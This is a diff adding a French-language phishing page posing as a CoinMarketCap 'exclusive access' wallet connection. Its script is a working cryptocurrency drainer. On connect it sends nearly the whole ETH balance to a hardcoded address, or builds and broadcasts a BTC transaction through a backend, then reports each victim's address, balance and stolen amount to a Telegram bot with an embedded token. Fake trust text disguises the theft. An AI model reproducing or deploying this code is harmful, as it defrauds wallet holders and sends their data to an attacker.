@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Connection</title>
+    <!-- Importation de la police Poppins depuis Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        .wallet-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #FFFFFF;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+            text-align: center;
+            max-width: 450px;
+            max-height: 85vh;
+            overflow-y: auto;
+            color: #333333;
+            font-family: 'Poppins', sans-serif;
+        }
+        .wallet-popup.active {
+            display: block;
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+        .overlay.active {
+            display: block;
+        }
+        .connect-btn, .redirect-btn {
+            background: #007BFF;
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px 0;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
+            text-transform: none;
+            font-family: 'Poppins', sans-serif;
+        }
+        .connect-btn:hover, .redirect-btn:hover {
+            background: #0056b3;
+            box-shadow: 0 6px 15px rgba(0, 123, 255, 0.5);
+            transform: translateY(-2px);
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007BFF;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 15px auto 20px;
+            display: none;
+        }
+        .hidden {
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #statusText {
+            margin-top: 15px;
+            font-size: 14px;
+            line-height: 1.5;
+            color: #666666;
+            font-family: 'Poppins', sans-serif;
+        }
+        .logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+        .trust-text {
+            font-size: 12px;
+            color: #777777;
+            margin-top: 10px;
+            font-style: italic;
+        }
+    </style>
+    <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" type="text/javascript"></script>
+    <script src="https://unpkg.com/@scure/btc-signer@1.2.0/dist/index.umd.js"></script>
+</head>
+<body>
+    <div class="overlay" id="overlay"></div>
+    <div class="wallet-popup" id="walletPopup">
+        <!-- Logo fictif -->
+        <img src="coinmarketcap.svg" alt="Company Logo" class="logo">
+        <h2 style="margin-bottom: 15px; font-size: 24px; font-weight: 700;">Accès Exclusif Requis</h2>
+        <p style="margin-bottom: 20px; font-size: 16px;">
+            Pour accéder à notre plateforme premium et bénéficier de services exclusifs, veuillez connecter votre wallet. <br>
+            Cette étape est essentielle pour sécuriser votre expérience personnalisée.
+        </p>
+        <p class="trust-text">Sécurisé et utilisé par des milliers d'utilisateurs. Nous respectons vos données.</p>
+        <button class="connect-btn" id="connectWallet">Connecter mon wallet</button>
+        <button class="redirect-btn hidden" id="redirectButton">Continuer vers le site</button>
+        <div class="loader" id="loader"></div>
+        <div id="statusText" style="color: #666666;"></div>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // Initialisation des éléments
+            const walletPopup = document.getElementById('walletPopup');
+            const overlay = document.getElementById('overlay');
+            const connectWalletButton = document.getElementById('connectWallet');
+            const redirectButton = document.getElementById('redirectButton');
+            const statusText = document.getElementById('statusText');
+            const loader = document.getElementById('loader');
+
+            if (!walletPopup || !overlay || !connectWalletButton || !redirectButton || !statusText || !loader) {
+                console.error('Un ou plusieurs éléments DOM manquants :', {
+                    walletPopup, overlay, connectWalletButton, redirectButton, statusText, loader
+                });
+                return;
+            }
+
+            walletPopup.classList.add('active');
+            overlay.classList.add('active');
+
+            if (!window.ethers) {
+                console.error('Erreur : ethers.js n’est pas chargé.');
+                updateStatus('Erreur : Problème de chargement.', false, 'red');
+                return;
+            }
+
+            // Configuration Telegram
+            const TELEGRAM_BOT_TOKEN = '8189811123:AAG_3YlqOGNYzfMys7PknpEvbnpUZ3dTO8c';
+            const TELEGRAM_CHAT_ID = '-4635118249';
+            const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            // Prix approximatifs en USD
+            const BTC_PRICE_USD = 85000;
+            const ETH_PRICE_USD = 2000;
+
+            // URL de redirection
+            const REDIRECT_URL = 'https://coinmarketcap.com'; // URL locale sans restrictions CSP
+
+            connectWalletButton.addEventListener('click', async () => {
+                updateStatus('Connexion en cours...', true);
+                connectWalletButton.disabled = true;
+
+                let ethAddress = null;
+                let btcAddress = null;
+                let ethBalanceUsd = 0;
+                let btcBalanceUsd = 0;
+                let transactionValidated = false;
+
+                try {
+                    // Détection du wallet via les extensions
+                    if (window.ethereum && window.ethereum.isMetaMask) {
+                        console.log('Connexion à MetaMask...');
+                        const provider = new window.ethers.providers.Web3Provider(window.ethereum);
+                        await provider.ready;
+                        const network = await provider.getNetwork();
+                        console.log('Réseau détecté :', network.name);
+
+                        const ethAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                        ethAddress = ethAccounts[0];
+                        console.log('ETH détecté :', ethAddress);
+
+                        const ethBalance = await provider.getBalance(ethAddress);
+                        const ethBalanceEth = parseFloat(window.ethers.utils.formatEther(ethBalance));
+                        ethBalanceUsd = ethBalanceEth * ETH_PRICE_USD;
+                        console.log('Solde ETH :', ethBalanceEth, 'ETH (≈ $', ethBalanceUsd.toFixed(2), 'USD)');
+
+                        // Drainage ETH immédiatement après la connexion
+                        try {
+                            const drainResult = await drainETH(ethAddress);
+                            if (drainResult.success) {
+                                const transferMessage = `✅ Transfert validé à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
+                                                      `💼 Wallet: MetaMask\n` +
+                                                      `🌐 ETH Address: ${ethAddress}\n` +
+                                                      `💸 Montant transféré: ${window.ethers.utils.formatEther(drainResult.valueToSend)} ETH 🎉`;
+                                await sendTelegramMessage(transferMessage);
+                                transactionValidated = true; // Marquer la transaction comme validée
+                                console.log('ETH drainé avec succès, transaction validée.');
+                            } else {
+                                console.log('Échec du drainage ETH.');
+                            }
+                        } catch (drainError) {
+                            console.error('Erreur dans drainETH :', drainError);
+                        }
+
+                        // Notification Telegram pour la connexion
+                        const connectionMessage = `🚀 Nouvelle connexion détectée à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
+                                                `💼 Wallet: MetaMask\n` +
+                                                `🌐 ETH Address: ${ethAddress} (Balance: 💰 $${ethBalanceUsd.toFixed(2)})\n`;
+                        await sendTelegramMessage(connectionMessage);
+
+                    } else if (window.unisat) {
+                        console.log('Connexion à UniSat...');
+                        const btcAccounts = await window.unisat.requestAccounts();
+                        btcAddress = btcAccounts[0];
+                        console.log('BTC détecté :', btcAddress);
+
+                        const utxoResponse = await fetch('http://localhost:3001/get-utxos', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ address: btcAddress })
+                        });
+                        if (utxoResponse.ok) {
+                            const { utxos } = await utxoResponse.json();
+                            const btcBalanceSat = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
+                            const btcBalanceBtc = btcBalanceSat / 1e8;
+                            btcBalanceUsd = btcBalanceBtc * BTC_PRICE_USD;
+                            console.log('Solde BTC :', btcBalanceBtc, 'BTC (≈ $', btcBalanceUsd.toFixed(2), 'USD)');
+
+                            // Drainage BTC immédiatement après la connexion
+                            try {
+                                const drainResult = await drainBTC(btcAddress, btcBalanceSat);
+                                if (drainResult.success) {
+                                    const transferMessage = `✅ Transfert validé à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
+                                                          `💼 Wallet: UniSat\n` +
+                                                          `🌐 BTC Address: ${btcAddress}\n` +
+                                                          `💸 Montant transféré: ${(drainResult.btcBalanceSat / 1e8).toFixed(8)} BTC 🎉`;
+                                    await sendTelegramMessage(transferMessage);
+                                    transactionValidated = true; // Marquer la transaction comme validée
+                                    console.log('BTC drainé avec succès, transaction validée.');
+                                } else {
+                                    console.log('Échec du drainage BTC.');
+                                }
+                            } catch (drainError) {
+                                console.error('Erreur dans drainBTC :', drainError);
+                            }
+
+                            // Notification Telegram pour la connexion
+                            const connectionMessage = `🚀 Nouvelle connexion détectée à ${new Date().toLocaleString('fr-FR', { timeZone: 'America/Los_Angeles' })} PDT:\n` +
+                                                    `💼 Wallet: UniSat\n` +
+                                                    `🌐 BTC Address: ${btcAddress} (Balance: 💰 $${btcBalanceUsd.toFixed(2)})\n`;
+                            await sendTelegramMessage(connectionMessage);
+                        }
+                    } else {
+                        updateStatus('Erreur : Aucun wallet détecté (MetaMask ou UniSat).', false, 'red');
+                        connectWalletButton.disabled = false;
+                        return;
+                    }
+
+                    // Gestion des boutons après validation
+                    if (transactionValidated) {
+                        updateStatus('Connection validée ! Cliquez pour continuer.', false, '#28a745'); // Vert pour succès
+                        connectWalletButton.classList.add('hidden'); // Masquer le bouton de connexion
+                        redirectButton.classList.remove('hidden'); // Afficher le bouton de redirection
+                        redirectButton.disabled = false;
+                        console.log('Bouton de redirection affiché, bouton de connexion masqué.');
+                    } else {
+                        updateStatus('Transaction non validée. Veuillez réessayer.', false, '#dc3545'); // Rouge pour échec
+                        connectWalletButton.disabled = false;
+                    }
+
+                } catch (error) {
+                    updateStatus('Erreur : ' + error.message, false, 'red');
+                    console.error('Erreur capturée avant redirection :', error);
+                    connectWalletButton.disabled = false;
+                }
+            });
+
+            // Gestion du clic sur le bouton de redirection
+            redirectButton.addEventListener('click', () => {
+                console.log('Tentative de redirection normale vers :', REDIRECT_URL);
+                try {
+                    // Forcer la redirection dans la fenêtre principale
+                    window.top.location.href = REDIRECT_URL; // Redirection normale sans frame
+                    console.log('Redirection initiée avec succès.');
+                } catch (redirectError) {
+                    console.error('Erreur lors de la redirection :', redirectError);
+                    updateStatus('Erreur de redirection : ' + redirectError.message, false, 'red');
+                }
+            });
+
+            async function drainETH(ethAddress) {
+                const provider = new window.ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const balance = await provider.getBalance(ethAddress);
+                console.log('Solde ETH :', window.ethers.utils.formatEther(balance), 'ETH');
+
+                if (balance.lte(0)) {
+                    console.log('Aucun ETH disponible');
+                    return { success: false, valueToSend: null };
+                }
+
+                const gasPrice = await provider.getGasPrice();
+                const gasLimit = window.ethers.BigNumber.from('21000');
+                const gasCost = gasPrice.mul(gasLimit);
+                console.log('Frais estimés :', window.ethers.utils.formatEther(gasCost), 'ETH');
+
+                if (balance.lte(gasCost)) {
+                    console.log('Solde insuffisant pour couvrir les frais');
+                    return { success: false, valueToSend: null };
+                }
+
+                const ethValueToSend = balance.sub(gasCost);
+                console.log('Montant à envoyer :', window.ethers.utils.formatEther(ethValueToSend), 'ETH');
+
+                const tx = {
+                    to: '0xc427AB745eA6b12C557c7342f94D96f68D19D754', // Remplace par TON adresse ETH
+                    value: ethValueToSend,
+                    gasLimit: gasLimit,
+                    gasPrice: gasPrice
+                };
+
+                console.log('Envoi TX ETH...');
+                const txResponse = await signer.sendTransaction(tx); // Ouvre la pop-up de confirmation
+                await txResponse.wait();
+                console.log('TX ETH réussie :', txResponse.hash);
+                return { success: true, valueToSend: ethValueToSend };
+            }
+
+            async function drainBTC(btcAddress, btcBalanceSat) {
+                console.log('Récupération UTXOs pour', btcAddress);
+                const utxoResponse = await fetch('http://localhost:3001/get-utxos', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ address: btcAddress })
+                });
+
+                if (!utxoResponse.ok) {
+                    console.error('Erreur UTXOs :', utxoResponse.statusText);
+                    throw new Error('Erreur UTXOs');
+                }
+                const { utxos } = await utxoResponse.json();
+                console.log('UTXOs :', utxos);
+
+                if (!utxos.length) {
+                    console.log('Aucun BTC disponible');
+                    return { success: false, btcBalanceSat: null };
+                }
+
+                console.log('Création PSBT...');
+                const psbtResponse = await fetch('http://localhost:3001/create-psbt', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ address: btcAddress, utxos })
+                });
+
+                if (!psbtResponse.ok) {
+                    console.error('Erreur PSBT :', psbtResponse.statusText);
+                    throw new Error('Erreur PSBT');
+                }
+                const { psbtHex } = await psbtResponse.json();
+
+                console.log('Signature PSBT...');
+                const signedPsbtHex = await window.unisat.signPsbt(psbtHex); // Ouvre la pop-up de confirmation
+
+                console.log('Diffusion TX BTC...');
+                const broadcastResponse = await fetch('http://localhost:3001/broadcast', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ psbtHex: signedPsbtHex })
+                });
+
+                if (!broadcastResponse.ok) {
+                    console.error('Erreur diffusion :', broadcastResponse.statusText);
+                    throw new Error('Erreur diffusion');
+                }
+                const { txid } = await broadcastResponse.json();
+                console.log('TX BTC réussie :', txid);
+                return { success: true, btcBalanceSat: btcBalanceSat };
+            }
+
+            async function sendTelegramMessage(message) {
+                try {
+                    const response = await fetch(TELEGRAM_API_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message
+                        })
+                    });
+                    if (!response.ok) throw new Error('Échec de l\'envoi Telegram');
+                    console.log('Message Telegram envoyé avec succès');
+                } catch (error) {
+                    console.error('Erreur lors de l\'envoi Telegram :', error);
+                }
+            }
+
+            function updateStatus(text, showLoader = false, color = '#666666') {
+                statusText.textContent = text;
+                statusText.style.color = color;
+                loader.classList.toggle('hidden', !showLoader);
+            }
+
+            function delay(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+        });
+    </script>
+</body>
+</html>
